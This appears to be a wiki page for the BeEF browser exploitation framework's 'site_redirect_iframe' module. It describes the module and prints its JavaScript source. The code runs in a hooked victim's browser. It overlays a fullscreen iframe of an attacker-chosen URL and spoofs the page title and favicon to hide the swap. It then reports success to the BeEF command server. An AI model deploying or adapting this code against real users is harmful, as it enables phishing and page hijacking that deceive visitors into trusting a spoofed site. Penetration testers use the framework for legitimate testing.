## Summary

* **Objective**: Replaces page content with another URL with an iFrame
* **Authors**: ethicalhack3r, Yori Kvitchko
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/site_redirect_iframe)

## Internal Working

```js

var result = 'Iframe successfully created!';
var title = '<%= @iframe_title %>';
var iframe_src = '<%= @iframe_src %>';
var iframe_favicon = '<%= @iframe_favicon %>';
var sent = false;

$j("iframe").remove();

beef.dom.createIframe('fullscreen', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
document.body.scroll = "no";
document.documentElement.style.overflow = 'hidden';
beef.browser.changeFavicon(iframe_favicon);


```

## Screenshots

[[Images/module-redirect-iframe1.png|align=center]]


## Feedback

